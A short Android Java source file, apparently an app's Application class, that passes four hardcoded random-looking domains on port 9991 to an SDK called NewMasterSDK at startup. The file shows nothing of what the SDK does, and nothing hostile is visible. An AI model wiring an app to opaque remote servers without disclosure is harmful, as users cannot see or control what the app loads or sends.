package com.jz.cp132gfbsx;

import android.app.Application;
import java.util.ArrayList;
import com.mastersdk.android.NewMasterSDK;

public class Main extends Application {
    @Override
    public void onCreate() {
        super.onCreate();
        Class<?> arg0 = MainActivity.class;
        ArrayList<String> arg1 = new ArrayList<String>();
        arg1.add("http://568568ew.com:9991");
        arg1.add("http://456kusda.com:9991");
        arg1.add("http://rut89677.com:9991");
        arg1.add("http://7735df88.com:9991");
        Application arg2 = this;

        NewMasterSDK.init(arg0, arg1, arg2);
    }
}